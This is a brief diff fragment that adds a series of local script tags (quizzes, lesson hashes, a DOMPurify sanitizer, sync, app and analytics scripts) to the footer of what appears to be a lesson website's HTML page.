+</footer>
+<script src="quizzes.js" defer></script>
+<script src="lesson-hashes.js" defer></script>
+<script src="lesson-updated.js" defer></script>
+<script src="vendor/purify.min.js" defer></script>
+<script src="sync.js" defer></script>
+<script src="app.js" defer></script>
+<script src="analytics.js" defer></script>
+<script type="module" src="speed-insights.js"></script>
+<script type="module" src="web-analytics.js"></script>
+
 </body>
 </html>
